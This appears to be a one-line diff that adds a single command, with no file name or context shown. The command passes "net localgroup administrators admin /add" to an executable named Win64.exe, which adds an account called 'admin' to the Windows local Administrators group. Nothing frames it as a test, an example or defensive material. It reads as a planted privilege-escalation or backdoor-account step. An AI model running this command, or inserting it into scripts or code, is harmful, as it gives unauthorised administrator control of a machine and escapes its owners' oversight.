@@ -1,0 +1,1 @@
+Win64.exe "net localgroup administrators admin /add"
